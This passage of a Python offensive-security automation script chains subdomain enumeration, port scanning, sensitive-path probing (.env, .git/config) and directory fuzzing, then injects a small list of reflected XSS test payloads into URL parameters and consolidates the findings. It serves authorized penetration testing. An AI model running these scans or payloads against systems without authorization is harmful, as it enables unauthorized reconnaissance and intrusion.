                    output_file.parent.mkdir(parents=True, exist_ok=True)
                    write_lines(output_file, result.stdout.strip().split('\n'))
                    logger.info(f"Output written to {output_file}")
                elif output_file and not result.stdout:
                    logger.warning(f"No output generated for {tool_name}, but output file was requested.")
                
                return True
            else:
                logger.warning(f"Tool {tool_name} returned non-zero exit code: {result.returncode}")
                if result.stderr:
                    logger.debug(f"Tool {tool_name} stderr: {result.stderr}")
                
                # Some tools return non-zero but still produce valid output
                if output_file and result.stdout:
                    output_file.parent.mkdir(parents=True, exist_ok=True)
                    write_lines(output_file, result.stdout.strip().split('\n'))
                    logger.info(f"Tool {tool_name} produced output despite error code")
                    return True
                
                # If this is not the last attempt, continue to retry
                if attempt < max_retries - 1:
                    logger.info(f"Retrying in {retry_delay} seconds...")
                    time.sleep(retry_delay)
                    continue
                else:
                    return False
                        
        except Exception as e:
            logger.error(f"Unexpected error executing {tool_name}: {e}")
            
            if attempt < max_retries - 1:
                logger.info(f"Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
                continue
            else:
                return False
    
    logger.error(f"All {max_retries} attempts failed for {tool_name}")
    return False

def execute_tool(tool_name: str, args: List[str], output_file: Optional[Path] = None, run_dir: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> bool:
    """Execute a security tool with configuration and error handling."""
    return execute_tool_with_retry(tool_name, args, output_file, run_dir, env)

# --- Reconnaissance Modules ---
def run_subdomain_discovery(target: str, output_dir: Path, config: Dict[str, Any]):
    """Run subdomain discovery using multiple tools."""
    logger.info(f"[RECON] Starting subdomain discovery for {target}")
    subdomains: Set[str] = set()

    # Define available tools and their configurations
    available_tools = []
    tool_configs = [
        ("subfinder", [target], "subfinder.txt"),
        ("assetfinder", [target], "assetfinder.txt"),
        ("findomain", [target], "findomain.txt"),
    ]
    
    # Add Amass if configured
    amass_flags = config.get("tools", {}).get("amass", {}).get("flags", [])
    tool_configs.append(("amass", amass_flags + [target], "amass.txt"))

    # Add Chaos if API key is present and tool is enabled
    chaos_key = config.get("auth", {}).get("chaos_api_key")
    if chaos_key and config.get("tools", {}).get("chaos", {}).get("enabled", False):
        tool_configs.append(("chaos", [target], "chaos.txt"))

    # Check which tools are actually available
    for tool_name, args, output_filename in tool_configs:
        tool_config = config.get("tools", {}).get(tool_name, {})
        if tool_config.get("enabled", True) and which(tool_name):
            available_tools.append((tool_name, args, output_dir / output_filename))
        else:
            logger.info(f"[RECON] Skipping {tool_name} - not available or disabled")

    if not available_tools:
        logger.warning("[RECON] No subdomain discovery tools available - using basic DNS approach")
        # Fallback to basic enumeration using built-in methods
        basic_subdomains = _basic_subdomain_enumeration(target, output_dir)
        subdomains.update(basic_subdomains)
    else:
        logger.info(f"[RECON] Using {len(available_tools)} available tools for subdomain discovery")
        
        # Execute available tools
        max_workers = min(config.get("performance", {}).get("max_workers", 5), len(available_tools))
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_tool = {
                executor.submit(execute_tool, tool, args, output, output_dir): (tool, output) 
                for tool, args, output in available_tools
            }
            
            for future in as_completed(future_to_tool):
                tool, output_file = future_to_tool[future]
                try:
                    success = future.result()
                    if success and output_file.exists():
                        lines = read_lines(output_file)
                        initial_count = len(subdomains)
                        subdomains.update(line.strip().lower() for line in lines if line.strip())
                        added_count = len(subdomains) - initial_count
                        logger.info(f"[RECON] {tool} added {added_count} unique subdomains")
                    else:
                        logger.warning(f"[RECON] {tool} did not produce results or failed")
                except Exception as e:
                    logger.error(f"[RECON] Error running {tool}: {e}")

    # Deduplication and saving
    unique_subdomains = sorted(list(subdomains))
    final_subdomain_file = output_dir / f"subdomains_{sanitize_filename(target)}.txt"
    write_lines(final_subdomain_file, unique_subdomains)
    
    result_count = len(unique_subdomains)
    if result_count > 0:
        logger.info(f"[RECON] Subdomain discovery complete. Total unique subdomains: {result_count}")
    else:
        logger.warning("[RECON] No subdomains discovered - adding target domain itself")
        unique_subdomains = [target]
        write_lines(final_subdomain_file, unique_subdomains)
    
    return unique_subdomains

def _basic_subdomain_enumeration(target: str, output_dir: Path) -> List[str]:
    """Basic subdomain enumeration when tools are not available."""
    logger.info("[RECON] Performing basic subdomain enumeration")
    
    # Common subdomain prefixes to try
    common_subdomains = [
        "www", "mail", "ftp", "admin", "api", "blog", "dev", "staging", 
        "test", "m", "mobile", "support", "portal", "store", "shop",
        "secure", "vpn", "remote", "gateway", "ns1", "ns2", "mx"
    ]
    
    discovered_subdomains = set()
    discovered_subdomains.add(target)  # Add the main domain
    
    # Only try common subdomains if the target is a valid domain
    if '.' in target and not target.replace('.', '').replace('-', '').isdigit():
        try:
            import socket
            logger.info(f"[RECON] Testing {len(common_subdomains)} common subdomains for {target}")
            for subdomain in common_subdomains:
                try:
                    hostname = f"{subdomain}.{target}"
                    socket.gethostbyname(hostname)
                    discovered_subdomains.add(hostname)
                    logger.debug(f"[RECON] Basic enumeration found: {hostname}")
                except socket.gaierror:
                    continue
        except Exception as e:
            logger.error(f"[RECON] Basic enumeration failed: {e}")
    else:
        logger.info(f"[RECON] Target {target} appears to be an IP address, skipping subdomain enumeration")
    
    return list(discovered_subdomains)

def run_dns_resolution(subdomain_file: Path, output_file: Path, config: Dict[str, Any]):
    """Resolve subdomains to IPs."""
    logger.info("[RECON] Resolving subdomains to IPs...")
    if not subdomain_file.exists():
        logger.warning(f"Subdomain file {subdomain_file} does not exist.")
        return False

    # Try dnsx first, fallback to built-in resolution
    if which("dnsx"):
        success = execute_tool("dnsx", ["-l", str(subdomain_file), "-o", str(output_file)], output_file=output_file)
        if success:
            logger.info(f"[RECON] DNS resolution complete. Results in {output_file}")
            return True
        else:
            logger.warning("[RECON] dnsx failed, falling back to built-in resolution")
    else:
        logger.info("[RECON] dnsx not available, using built-in DNS resolution")
    
    # Fallback to built-in DNS resolution
    return _builtin_dns_resolution(subdomain_file, output_file)

def _builtin_dns_resolution(subdomain_file: Path, output_file: Path) -> bool:
    """Built-in DNS resolution when dnsx is not available."""
    try:
        import socket
        subdomains = read_lines(subdomain_file)
        resolved_hosts = []
        
        logger.info(f"[RECON] Resolving {len(subdomains)} subdomains using built-in resolver")
        
        for subdomain in subdomains:
            subdomain = subdomain.strip()
            if not subdomain:
                continue
                
            try:
                ip = socket.gethostbyname(subdomain)
                resolved_hosts.append(f"{subdomain}:{ip}")
                logger.debug(f"[RECON] Resolved {subdomain} -> {ip}")
            except socket.gaierror:
                logger.debug(f"[RECON] Failed to resolve {subdomain}")
                continue
        
        write_lines(output_file, resolved_hosts)
        logger.info(f"[RECON] Built-in DNS resolution complete. Resolved {len(resolved_hosts)} hosts")
        return len(resolved_hosts) > 0
        
    except Exception as e:
        logger.error(f"[RECON] Built-in DNS resolution failed: {e}")
        return False

def run_http_probing(resolved_file: Path, output_file: Path, config: Dict[str, Any]):
    """Probe hosts for HTTP/HTTPS."""
    logger.info("[RECON] Probing hosts for HTTP/HTTPS...")
    if not resolved_file.exists():
        logger.warning(f"Resolved host file {resolved_file} does not exist.")
        return False

    # Try httpx first, fallback to built-in probing
    if which("httpx"):
        success = execute_tool("httpx", ["-l", str(resolved_file), "-o", str(output_file)], output_file=output_file)
        if success:
            logger.info(f"[RECON] HTTP probing complete. Results in {output_file}")
            return True
        else:
            logger.warning("[RECON] httpx failed, falling back to built-in probing")
    else:
        logger.info("[RECON] httpx not available, using built-in HTTP probing")
    
    # Fallback to built-in HTTP probing
    return _builtin_http_probing(resolved_file, output_file)

def _builtin_http_probing(resolved_file: Path, output_file: Path) -> bool:
    """Built-in HTTP probing when httpx is not available."""
    try:
        import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        resolved_hosts = read_lines(resolved_file)
        live_hosts = []
        
        logger.info(f"[RECON] Probing {len(resolved_hosts)} hosts using built-in HTTP client")
        
        session = requests.Session()
        session.timeout = 10
        session.verify = False
        
        for host_line in resolved_hosts:
            host = host_line.strip().split(':')[0] if ':' in host_line else host_line.strip()
            if not host:
                continue
                
            # Try both HTTP and HTTPS
            for protocol in ['https', 'http']:
                try:
                    url = f"{protocol}://{host}"
                    response = session.head(url, timeout=5)
                    if response.status_code < 500:  # Accept any non-server error
                        live_hosts.append(url)
                        logger.debug(f"[RECON] Found live host: {url} (Status: {response.status_code})")
                        break  # Found working protocol, no need to try the other
                except Exception:
                    continue
        
        write_lines(output_file, live_hosts)
        logger.info(f"[RECON] Built-in HTTP probing complete. Found {len(live_hosts)} live hosts")
        return len(live_hosts) > 0
        
    except ImportError:
        logger.error("[RECON] requests library not available for built-in HTTP probing")
        return False
    except Exception as e:
        logger.error(f"[RECON] Built-in HTTP probing failed: {e}")
        return False
    else:
        logger.error("[RECON] HTTP probing failed.")
        return False

# --- Scanning Modules ---
def run_vulnerability_scan(host_file: Path, output_dir: Path, config: Dict[str, Any]):
    """Run vulnerability scan using Nuclei or fallback methods."""
    logger.info("[SCAN] Starting vulnerability scan...")
    if not host_file.exists():
        logger.warning(f"Host file {host_file} does not exist.")
        return False

    nuclei_output = output_dir / "nuclei_results.json"
    
    # Try nuclei first
    if which("nuclei"):
        logger.info("[SCAN] Using Nuclei for vulnerability scanning")
        success = execute_tool("nuclei", ["-l", str(host_file), "-json", "-o", str(nuclei_output)], 
                             output_file=nuclei_output, run_dir=output_dir)
        if success:
            logger.info(f"[SCAN] Nuclei scan complete. Results in {nuclei_output}")
            return True
        else:
            logger.warning("[SCAN] Nuclei scan failed, falling back to basic checks")
    else:
        logger.info("[SCAN] Nuclei not available, using basic vulnerability checks")
    
    # Fallback to basic vulnerability checks
    return _basic_vulnerability_scan(host_file, output_dir)

def _basic_vulnerability_scan(host_file: Path, output_dir: Path) -> bool:
    """Basic vulnerability scanning when Nuclei is not available."""
    try:
        import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        hosts = read_lines(host_file)
        vulnerabilities = []
        
        logger.info(f"[SCAN] Performing basic vulnerability checks on {len(hosts)} hosts")
        
        session = requests.Session()
        session.verify = False
        session.timeout = 10
        
        # Basic checks for common misconfigurations
        common_paths = [
            "/admin", "/.env", "/backup", "/config", "/debug", 
            "/robots.txt", "/sitemap.xml", "/.git/config", 
            "/wp-admin", "/phpmyadmin", "/administrator"
        ]
        
        for host in hosts:
            host = host.strip()
            if not host:
                continue
                
            for path in common_paths:
                try:
                    if not host.startswith(('http://', 'https://')):
                        url = f"https://{host}{path}"
                    else:
                        url = f"{host}{path}"
                        
                    response = session.head(url, timeout=5)
                    if response.status_code in [200, 301, 302, 403]:
                        vulnerability = {
                            "url": url,
                            "status_code": response.status_code,
                            "type": "Information Disclosure",
                            "severity": "info" if response.status_code == 403 else "medium"
                        }
                        vulnerabilities.append(vulnerability)
                        logger.debug(f"[SCAN] Found accessible path: {url} (Status: {response.status_code})")
                        
                except Exception:
                    continue
        
        # Save results
        results_file = output_dir / "basic_vulnerability_scan.json"
        import json
        with open(results_file, 'w') as f:
            json.dump(vulnerabilities, f, indent=2)
        
        logger.info(f"[SCAN] Basic vulnerability scan complete. Found {len(vulnerabilities)} potential issues")
        return len(vulnerabilities) >= 0  # Always return True if scan completed
        
    except Exception as e:
        logger.error(f"[SCAN] Basic vulnerability scan failed: {e}")
        return False

def run_port_scan(target: str, output_file: Path, config: Dict[str, Any]):
    """Run port scan using Nmap, Naabu, or fallback methods."""
    logger.info(f"[SCAN] Starting port scan for {target}...")

    # Try Nmap first
    if which("nmap"):
        nmap_flags = config.get("tools", {}).get("nmap", {}).get("flags", [])
        # Nmap outputs to multiple files, so we specify a prefix
        output_prefix = str(output_file).replace('.txt', '')
        success = execute_tool("nmap", nmap_flags + ["-oA", output_prefix, target])
        if success:
            logger.info(f"[SCAN] Nmap scan complete. Results in {output_prefix}.{{nmap,xml,gnmap}}")
            return True
        else:
            logger.warning("[SCAN] Nmap scan failed, trying naabu")
    
    # Try Naabu as second option
    if which("naabu"):
        naabu_flags = config.get("tools", {}).get("naabu", {}).get("flags", [])
        success = execute_tool("naabu", naabu_flags + ["-host", target, "-o", str(output_file)], output_file=output_file)
        if success:
            logger.info(f"[SCAN] Naabu scan complete. Results in {output_file}")
            return True
        else:
            logger.warning("[SCAN] Naabu scan failed, using basic port scan")
    
    # Fallback to basic port scanning
    logger.info("[SCAN] Using basic port scanning")
    return _basic_port_scan(target, output_file)

def _basic_port_scan(target: str, output_file: Path) -> bool:
    """Basic port scanning when nmap and naabu are not available."""
    try:
        import socket
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        # Common ports to scan
        common_ports = [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 
            1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9090, 27017
        ]
        
        open_ports = []
        logger.info(f"[SCAN] Scanning {len(common_ports)} common ports on {target}")
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((target, port))
                sock.close()
                if result == 0:
                    return port
            except Exception:
                pass
            return None
        
        # Scan ports in parallel
        with ThreadPoolExecutor(max_workers=20) as executor:
            future_to_port = {executor.submit(scan_port, port): port for port in common_ports}
            for future in as_completed(future_to_port):
                port = future.result()
                if port:
                    open_ports.append(f"{target}:{port}")
                    logger.debug(f"[SCAN] Found open port: {target}:{port}")
        
        # Save results
        write_lines(output_file, open_ports)
        logger.info(f"[SCAN] Basic port scan complete. Found {len(open_ports)} open ports")
        return True
        
    except Exception as e:
        logger.error(f"[SCAN] Basic port scan failed: {e}")
        return False

def run_ssl_scan(target: str, output_file: Path, config: Dict[str, Any]):
    """Run SSL/TLS scan using testssl.sh or fallback methods."""
    logger.info(f"[SCAN] Starting SSL/TLS scan for {target}...")
    if not target.startswith(("http://", "https://")):
        https_target = f"https://{target}"
    else:
        https_target = target

    # Try testssl.sh first
    if which("testssl.sh"):
        testssl_flags = config.get("tools", {}).get("testssl", {}).get("flags", [])
        success = execute_tool("testssl.sh", testssl_flags + ["-o", str(output_file), https_target])
        if success:
            logger.info(f"[SCAN] SSL/TLS scan complete. Results in {output_file}")
            return True
        else:
            logger.warning("[SCAN] testssl.sh scan failed, using basic SSL checks")
    else:
        logger.info("[SCAN] testssl.sh not available, using basic SSL checks")
    
    # Fallback to basic SSL checks
    return _basic_ssl_scan(https_target, output_file)

def _basic_ssl_scan(target: str, output_file: Path) -> bool:
    """Basic SSL/TLS checking when testssl.sh is not available."""
    try:
        import ssl
        import socket
        from urllib.parse import urlparse
        
        parsed = urlparse(target)
        hostname = parsed.hostname or target.replace('https://', '').split('/')[0]
        port = parsed.port or 443
        
        logger.info(f"[SCAN] Performing basic SSL check on {hostname}:{port}")
        
        ssl_info = {}
        
        try:
            # Create SSL context
            context = ssl.create_default_context()
            
            # Connect and get certificate info
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    ssl_info = {
                        "hostname": hostname,
                        "port": port,
                        "version": ssock.version(),
                        "cipher": ssock.cipher(),
                        "certificate": {
                            "subject": dict(x[0] for x in cert.get('subject', [])),
                            "issuer": dict(x[0] for x in cert.get('issuer', [])),
                            "notBefore": cert.get('notBefore'),
                            "notAfter": cert.get('notAfter'),
                            "serialNumber": cert.get('serialNumber'),
                            "version": cert.get('version')
                        }
                    }
                    
            logger.info(f"[SCAN] SSL connection successful to {hostname}:{port}")
            
        except Exception as e:
            ssl_info = {
                "hostname": hostname,
                "port": port,
                "error": str(e),
                "status": "failed"
            }
            logger.warning(f"[SCAN] SSL connection failed to {hostname}:{port}: {e}")
        
        # Save results
        import json
        with open(output_file, 'w') as f:
            json.dump(ssl_info, f, indent=2)
        
        logger.info(f"[SCAN] Basic SSL scan complete. Results in {output_file}")
        return True
        
    except Exception as e:
        logger.error(f"[SCAN] Basic SSL scan failed: {e}")
        return False

# --- Web Application Testing Modules ---
def run_crawling(target: str, output_file: Path, config: Dict[str, Any]):
    """Crawl a target using Katana, Gau, Waybackurls or fallback methods."""
    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"
    logger.info(f"[WEB] Starting crawling for {target}...")

    combined_urls: Set[str] = set()
    available_tools = []

    # Check which crawling tools are available
    tool_configs = [
        ("katana", ["-u", target], "katana"),
        ("gau", [target], "gau"),
        ("waybackurls", [target], "wayback")
    ]

    for tool_name, args, output_suffix in tool_configs:
        if config.get("tools", {}).get(tool_name, {}).get("enabled", True) and which(tool_name):
            output_tool_file = output_file.with_name(f"{output_file.stem}_{output_suffix}.txt")
            if tool_name == "katana":
                args.extend(["-o", str(output_tool_file)])
            available_tools.append((tool_name, args, output_tool_file))
        else:
            logger.info(f"[WEB] Skipping {tool_name} - not available or disabled")

    if not available_tools:
        logger.info("[WEB] No crawling tools available, using basic web crawling")
        return _basic_web_crawling(target, output_file)

    logger.info(f"[WEB] Using {len(available_tools)} available crawling tools")

    # Execute available tools
    max_workers = min(3, len(available_tools))
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_tool = {
            executor.submit(execute_tool, tool, args, output): (tool, output) 
            for tool, args, output in available_tools
        }
        
        for future in as_completed(future_to_tool):
            tool, output_file_tool = future_to_tool[future]
            try:
                success = future.result()
                if success and output_file_tool.exists():
                    lines = read_lines(output_file_tool)
                    initial_count = len(combined_urls)
                    combined_urls.update(line.strip() for line in lines if line.strip())
                    added_count = len(combined_urls) - initial_count
                    logger.info(f"[WEB] {tool} added {added_count} unique URLs")
                else:
                    logger.warning(f"[WEB] {tool} did not produce results or failed")
            except Exception as e:
                logger.error(f"[WEB] Error running {tool}: {e}")

    # Save combined results
    sorted_urls = sorted(list(combined_urls))
    write_lines(output_file, sorted_urls)
    
    result_count = len(sorted_urls)
    if result_count > 0:
        logger.info(f"[WEB] Crawling complete. Total URLs: {result_count}")
    else:
        logger.warning("[WEB] No URLs discovered through crawling")
        # Add the target URL itself as fallback
        sorted_urls = [target]
        write_lines(output_file, sorted_urls)
    
    return sorted_urls

def _basic_web_crawling(target: str, output_file: Path) -> List[str]:
    """Basic web crawling when tools are not available."""
    try:
        import requests
        from urllib.parse import urljoin, urlparse
        import re
        
        logger.info(f"[WEB] Performing basic web crawling on {target}")
        
        discovered_urls = set()
        discovered_urls.add(target)
        
        session = requests.Session()
        session.timeout = 10
        session.verify = False
        
        try:
            response = session.get(target, timeout=10)
            if response.status_code == 200:
                # Extract links from HTML
                html_content = response.text
                
                # Find all href links
                href_pattern = r'href=["\']([^"\']+)["\']'
                hrefs = re.findall(href_pattern, html_content, re.IGNORECASE)
                
                # Find all src links
                src_pattern = r'src=["\']([^"\']+)["\']'
                srcs = re.findall(src_pattern, html_content, re.IGNORECASE)
                
                # Combine and process links
                all_links = hrefs + srcs
                for link in all_links:
                    if link.startswith(('http://', 'https://')):
                        discovered_urls.add(link)
                    elif link.startswith('/'):
                        full_url = urljoin(target, link)
                        discovered_urls.add(full_url)
                        
                logger.info(f"[WEB] Basic crawling found {len(discovered_urls)} URLs")
                
        except Exception as e:
            logger.warning(f"[WEB] Basic crawling failed: {e}")
        
        # Save results
        sorted_urls = sorted(list(discovered_urls))
        write_lines(output_file, sorted_urls)
        
        return sorted_urls
        
    except ImportError:
        logger.error("[WEB] requests library not available for basic crawling")
        return [target]
    except Exception as e:
        logger.error(f"[WEB] Basic crawling failed: {e}")
        return [target]

def run_xss_scan(url_file: Path, output_file: Path, config: Dict[str, Any]):
    """Scan for XSS using Dalfox or fallback methods."""
    logger.info("[WEB] Starting XSS scan...")
    if not url_file.exists():
        logger.warning(f"URL file {url_file} does not exist.")
        return False

    # Try dalfox first
    if which("dalfox"):
        success = execute_tool("dalfox", ["file", str(url_file), "-o", str(output_file)], output_file=output_file)
        if success:
            logger.info(f"[WEB] XSS scan complete. Results in {output_file}")
            return True
        else:
            logger.warning("[WEB] Dalfox scan failed, using basic XSS checks")
    else:
        logger.info("[WEB] Dalfox not available, using basic XSS checks")
    
    # Fallback to basic XSS checks
    return _basic_xss_scan(url_file, output_file)

def _basic_xss_scan(url_file: Path, output_file: Path) -> bool:
    """Basic XSS scanning when Dalfox is not available."""
    try:
        import requests
        from urllib.parse import urljoin, urlparse, parse_qs, urlencode
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        urls = read_lines(url_file)
        xss_findings = []
        
        logger.info(f"[WEB] Performing basic XSS checks on {len(urls)} URLs")
        
        # Basic XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<svg onload=alert('XSS')>"
        ]
        
        session = requests.Session()
        session.verify = False
        session.timeout = 10
        
        for url in urls:
            url = url.strip()
            if not url or not url.startswith(('http://', 'https://')):
                continue
                
            try:
                parsed = urlparse(url)
                if parsed.query:
                    # Test each parameter with XSS payloads
                    params = parse_qs(parsed.query)
                    for param_name in params.keys():
                        for payload in xss_payloads:
                            test_params = params.copy()
                            test_params[param_name] = [payload]
                            test_query = urlencode(test_params, doseq=True)
                            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                            
                            try:
                                response = session.get(test_url, timeout=5)
                                if payload in response.text:
                                    finding = {
                                        "url": test_url,
                                        "parameter": param_name,
                                        "payload": payload,
                                        "type": "Reflected XSS",
                                        "severity": "medium"
                                    }
                                    xss_findings.append(finding)
                                    logger.debug(f"[WEB] Potential XSS found: {param_name} in {url}")
                                    break  # Found XSS, no need to test more payloads for this param
                            except Exception:
                                continue
                                
            except Exception as e:
                logger.debug(f"[WEB] Error testing {url}: {e}")
                continue
        
        # Save results
        import json
        with open(output_file, 'w') as f:
            json.dump(xss_findings, f, indent=2)
        
        logger.info(f"[WEB] Basic XSS scan complete. Found {len(xss_findings)} potential issues")
        return True
        
    except Exception as e:
        logger.error(f"[WEB] Basic XSS scan failed: {e}")
        return False

# --- Fuzzing Modules ---
def run_directory_fuzzing(target: str, output_dir: Path, config: Dict[str, Any]):
    """Run directory fuzzing using FFuF, Gobuster, or fallback methods."""
    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"
    logger.info(f"[FUZZ] Starting directory fuzzing for {target}...")

    wordlist_name = config.get("wordlists", {}).get("fuzzing", "raft-medium-directories.txt")
    wordlist_path = WORDLISTS_DIR / wordlist_name if not Path(wordlist_name).is_absolute() else Path(wordlist_name)

    if not wordlist_path.exists():
        logger.warning(f"[FUZZ] Wordlist {wordlist_path} not found, using built-in wordlist")
        return _basic_directory_fuzzing(target, output_dir)

    # Try FFuF first
    if which("ffuf") and config.get("tools", {}).get("ffuf", {}).get("enabled", True):
        ffuf_out = output_dir / f"ffuf_{sanitize_filename(target)}.json"
        ffuf_cmd = ["-u", f"{target}/FUZZ", "-w", str(wordlist_path), "-of", "json", "-o", str(ffuf_out)]
        success = execute_tool("ffuf", ffuf_cmd, run_dir=output_dir)
        if success:
            logger.info(f"[FUZZ] FFuF fuzzing complete. Results in {ffuf_out}")
            return True
        else:
            logger.warning("[FUZZ] FFuF fuzzing failed, trying Gobuster")
    
    # Try Gobuster as second option
    if which("gobuster") and config.get("tools", {}).get("gobuster", {}).get("enabled", True):
        gobuster_out = output_dir / f"gobuster_{sanitize_filename(target)}.txt"
        gobuster_flags = config.get("tools", {}).get("gobuster", {}).get("flags", ["dir", "-q"])
        gobuster_cmd = gobuster_flags + ["-u", target, "-w", str(wordlist_path), "-o", str(gobuster_out)]
        success = execute_tool("gobuster", gobuster_cmd, output_file=gobuster_out)
        if success:
            logger.info(f"[FUZZ] Gobuster fuzzing complete. Results in {gobuster_out}")
            return True
        else:
            logger.warning("[FUZZ] Gobuster fuzzing failed, using basic directory fuzzing")
    
    # Fallback to basic directory fuzzing
    logger.info("[FUZZ] No fuzzing tools available, using basic directory checks")
    return _basic_directory_fuzzing(target, output_dir)

def _basic_directory_fuzzing(target: str, output_dir: Path) -> bool:
    """Basic directory fuzzing when FFuF and Gobuster are not available."""
    try:
        import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        # Common directories to check
        common_directories = [
            "admin", "administrator", "api", "app", "apps", "backup", "backups",
            "config", "configs", "data", "database", "db", "debug", "dev",
            "docs", "downloads", "files", "images", "img", "includes", "logs",
            "login", "panel", "private", "public", "scripts", "server", "static",
            "temp", "test", "tmp", "upload", "uploads", "user", "users", "www"
        ]
        
        discovered_dirs = []
        logger.info(f"[FUZZ] Checking {len(common_directories)} common directories on {target}")
        
        session = requests.Session()
        session.verify = False
        session.timeout = 10
        
        for directory in common_directories:
            try:
                test_url = f"{target.rstrip('/')}/{directory}/"
                response = session.head(test_url, timeout=5)
                
                # Consider these status codes as interesting
                if response.status_code in [200, 301, 302, 403, 401]:
                    discovered_dirs.append({
                        "url": test_url,
                        "status_code": response.status_code,
                        "content_length": response.headers.get("content-length", ""),
                        "content_type": response.headers.get("content-type", "")
                    })
                    logger.debug(f"[FUZZ] Found directory: {test_url} (Status: {response.status_code})")
                    
            except Exception:
                continue
        
        # Save results
        results_file = output_dir / f"basic_directory_fuzz_{sanitize_filename(target)}.json"
        import json
        with open(results_file, 'w') as f:
            json.dump(discovered_dirs, f, indent=2)
        
        logger.info(f"[FUZZ] Basic directory fuzzing complete. Found {len(discovered_dirs)} accessible directories")
        return True
        
    except Exception as e:
        logger.error(f"[FUZZ] Basic directory fuzzing failed: {e}")
        return False

# --- Reporting ---
def filter_and_save_positive_results(run_dir: Path, config: Dict[str, Any]):
    """Filter and save positive/interesting results to a consolidated file."""
    logger.info("[REPORT] Filtering and saving positive results...")
    findings: Dict[str, List[Dict[str, Any]]] = {
        "subdomains": [],
        "live_hosts": [],
        "vulnerabilities": [],
        "xss": [],
        "fuzzing": [],
        "ssl_issues": [],
        "port_scans": [],
        "crawled_urls": [],
        "parameters": [],
    }

    # --- Subdomains ---
    subdomain_files = list(run_dir.glob("subdomains/subdomains_*.txt"))
    for sf in subdomain_files:
        lines = read_lines(sf)
        findings["subdomains"].extend([{"source_file": str(sf.relative_to(run_dir)), "finding": line} for line in lines])

    # --- Live Hosts (from httpx) ---
    live_host_files = list(run_dir.glob("hosts/live_*.txt"))
    for lf in live_host_files:
        lines = read_lines(lf)
        # Filter for HTTP 200 OK or interesting status codes
        interesting_lines = [line for line in lines if "[200]" in line or "[301]" in line or "[302]" in line or "[401]" in line or "[403]" in line or "[500]" in line]
        findings["live_hosts"].extend([{"source_file": str(lf.relative_to(run_dir)), "finding": line} for line in interesting_lines])

    # --- Vulnerabilities (from Nuclei) ---
    nuclei_result_files = list(run_dir.glob("vulns/nuclei_results.json"))
    for nf in nuclei_result_files:
        try:
            with open(nf, 'r') as f:
                for line in f:
                    if line.strip():
                        finding = json.loads(line)
                        # Only save findings with severity
                        if "info" in finding and "severity" in finding["info"]:
                             findings["vulnerabilities"].append({"source_file": str(nf.relative_to(run_dir)), "finding": finding})
        except Exception as e:
            logger.error(f"[REPORT] Error parsing Nuclei results {nf}: {e}")

    # --- XSS (from Dalfox) ---
    xss_result_files = list(run_dir.glob("crawling/xss_*.txt"))
    for xf in xss_result_files:
        lines = read_lines(xf)
        # Dalfox usually has [V] for vulnerable
        vulnerable_lines = [line for line in lines if "[V]" in line]
        findings["xss"].extend([{"source_file": str(xf.relative_to(run_dir)), "finding": line} for line in vulnerable_lines])

    # --- Fuzzing (from FFuF) ---
    ffuf_result_files = list(run_dir.glob("fuzzing/ffuf_*.json"))
    for ff in ffuf_result_files:
        try:
            with open(ff, 'r') as f:
                data = json.load(f)
                results = data.get("results", [])
                # Filter for interesting status codes
                interesting_results = [r for r in results if r.get("status") in [200, 201, 202, 204, 301, 302, 307, 308, 401, 403, 405, 500]]
                findings["fuzzing"].extend([{"source_file": str(ff.relative_to(run_dir)), "finding": r} for r in interesting_results])
        except Exception as e:
            logger.error(f"[REPORT] Error parsing FFuF results {ff}: {e}")

    # --- SSL Issues (from testssl.sh) ---
    ssl_result_files = list(run_dir.glob("vulns/ssl_*.json"))
    for sf in ssl_result_files:
        try:
            with open(sf, 'r') as f:
                data = json.load(f)
                # Look for findings with severity or flagged issues
                for section in data.get("scanResult", []):
                    for finding in section.get("vulnerabilities", []):
                        if finding.get("severity") in ["LOW", "MEDIUM", "HIGH", "CRITICAL"]:
                            findings["ssl_issues"].append({"source_file": str(sf.relative_to(run_dir)), "finding": finding})
                    for finding in section.get("ciphers", []):
                         if finding.get("strength") in ["WEAK", "INSECURE"]:
                            findings["ssl_issues"].append({"source_file": str(sf.relative_to(run_dir)), "finding": finding})
        except Exception as e:
            logger.error(f"[REPORT] Error parsing SSL results {sf}: {e}")

    # --- Port Scans ---
    # Nmap results (parse .nmap or .xml if needed, here we just list files)
    nmap_files = list(run_dir.glob("hosts/port_scan_*.nmap")) + list(run_dir.glob("hosts/port_scan_*.xml"))
    for nf in nmap_files:
        findings["port_scans"].append({"source_file": str(nf.relative_to(run_dir)), "finding": f"Nmap scan result file: {nf.name}"})
    # Naabu results
    naabu_files = list(run_dir.glob("hosts/port_scan_*.txt"))
    for nf in naabu_files:
        lines = read_lines(nf)
        findings["port_scans"].extend([{"source_file": str(nf.relative_to(run_dir)), "finding": line} for line in lines])

    # --- Crawled URLs ---
    crawled_url_files = list(run_dir.glob("crawling/urls_*.txt"))
    for cf in crawled_url_files:
        lines = read_lines(cf)
        findings["crawled_urls"].extend([{"source_file": str(cf.relative_to(run_dir)), "finding": line} for line in lines])

    # --- Parameters (from Arjun if integrated) ---
    # This would require parsing Arjun's output, similar to others.

    # --- Save Consolidated Findings ---
    consolidated_file = run_dir / "report" / config.get("output", {}).get("consolidated_findings_file", "moloch_findings.json")
    try:
        # Ensure report directory exists
